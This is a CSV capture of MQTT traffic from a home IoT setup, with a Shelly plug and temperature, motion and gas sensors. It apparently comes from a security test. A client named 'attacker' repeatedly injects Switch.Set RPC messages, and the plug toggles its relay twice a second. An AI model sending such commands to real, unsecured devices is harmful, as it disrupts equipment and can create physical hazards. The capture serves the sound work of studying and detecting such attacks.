2026-04-22T16:19:55,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4065 33328.530 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:55,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:55,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33328.53,""swi"
2026-04-22T16:19:55,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4066 33328.549 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:56,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:56,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4067 33329.031 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:56,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:56,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33329.03,""swi"
2026-04-22T16:19:56,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4068 33329.047 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:56,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:19:56,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:19:56,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:19:56,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:19:56,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:19:56,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:56,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:56,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4069 33329.531 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:56,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:56,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33329.53,""swi"
2026-04-22T16:19:56,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4070 33329.549 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:57,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:57,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4071 33330.034 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:57,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:57,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33330.03,""swi"
2026-04-22T16:19:57,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4072 33330.051 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:57,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:57,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:57,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4073 33330.534 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:57,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:57,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33330.53,""swi"
2026-04-22T16:19:57,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4074 33330.552 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:58,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:58,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:58,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4075 33331.033 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:58,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:58,iot/pir/binary_sensor/motion/state,3,OFF
2026-04-22T16:19:58,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33331.03,""swi"
2026-04-22T16:19:58,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4076 33331.050 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:58,iot/pir/debug,50,[0;36m[D][binary_sensor:048]: 'Motion' >> OFF[0m
2026-04-22T16:19:58,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:58,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:58,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4077 33331.533 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:58,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:58,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33331.53,""swi"
2026-04-22T16:19:58,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4078 33331.552 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:19:59,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:19:59,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:19:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4079 33332.034 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:59,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:19:59,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33332.03,""swi"
2026-04-22T16:19:59,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4080 33332.051 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:19:59,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:19:59,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:19:59,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:19:59,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:19:59,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4081 33332.534 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:19:59,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:19:59,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33332.53,""swi"
2026-04-22T16:19:59,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4082 33332.553 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:20:00,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:20:00,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:20:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4083 33333.034 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:00,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:20:00,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33333.03,""swi"
2026-04-22T16:20:00,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4084 33333.051 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:20:00,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:20:00,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:20:00,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4085 33333.535 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:00,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:20:00,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33333.53,""swi"
2026-04-22T16:20:00,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4086 33333.554 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:20:01,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:20:01,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:20:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4087 33334.036 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:01,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:20:01,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33334.03,""swi"
2026-04-22T16:20:01,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4088 33334.052 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:20:01,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:20:01,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:20:01,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4089 33334.538 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:01,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:20:01,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33334.53,""swi"
2026-04-22T16:20:01,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4090 33334.557 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:20:02,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:20:02,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:20:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4091 33335.037 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:02,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:20:02,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33335.03,""swi"
2026-04-22T16:20:02,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4092 33335.053 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:20:02,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:20:02,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:20:02,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4093 33335.538 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:02,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.5, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:20:02,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33335.54,""swi"
2026-04-22T16:20:02,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4094 33335.557 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:20:03,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:20:03,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:20:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4095 33336.038 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:03,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:20:03,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33336.04,""swi"
2026-04-22T16:20:03,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4096 33336.055 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:20:03,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:20:03,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:20:03,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4097 33336.539 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:03,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:20:03,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33336.54,""swi"
2026-04-22T16:20:03,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4098 33336.558 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:20:04,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:20:04,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:20:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4099 33337.044 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:04,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:20:04,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33337.04,""swi"
2026-04-22T16:20:04,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4100 33337.060 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:20:04,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:20:04,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:20:04,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:20:04,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:20:04,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4101 33337.541 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:04,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:20:04,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33337.54,""swi"
2026-04-22T16:20:04,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4102 33337.559 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:20:05,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:20:05,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:20:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4103 33338.041 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:05,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:20:05,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33338.04,""swi"
2026-04-22T16:20:05,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4104 33338.057 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:20:05,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:20:05,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:20:05,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4105 33338.541 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:05,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:20:05,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33338.54,""swi"
2026-04-22T16:20:05,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4106 33338.560 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:20:06,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:20:06,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:20:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4107 33339.045 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:06,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:20:06,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33339.04,""swi"
2026-04-22T16:20:06,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4108 33339.062 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:20:06,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:20:06,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:20:06,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:20:06,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:20:06,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:20:06,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:20:06,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:20:06,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4109 33339.542 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:06,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.6, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:20:06,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33339.54,""swi"
2026-04-22T16:20:06,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4110 33339.561 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:20:07,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:20:07,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:20:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4111 33340.043 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:07,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:20:07,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33340.04,""swi"
2026-04-22T16:20:07,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 4112 33340.059 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:20:07,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:20:07,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:20:07,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 4113 33340.543 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:20:07,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":231.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:20:07,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":33340.54,""swi"
2026-04-22T16:20:07,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 4114 33340.562 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:20:09,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:20:09,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:20:14,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:20:14,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:20:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.8°C Humidity 39.0%[0m
2026-04-22T16:20:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.8 °C[0m
2026-04-22T16:20:16,iot/dht11/sensor/temperature/state,4,24.8
2026-04-22T16:20:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:20:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:20:19,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
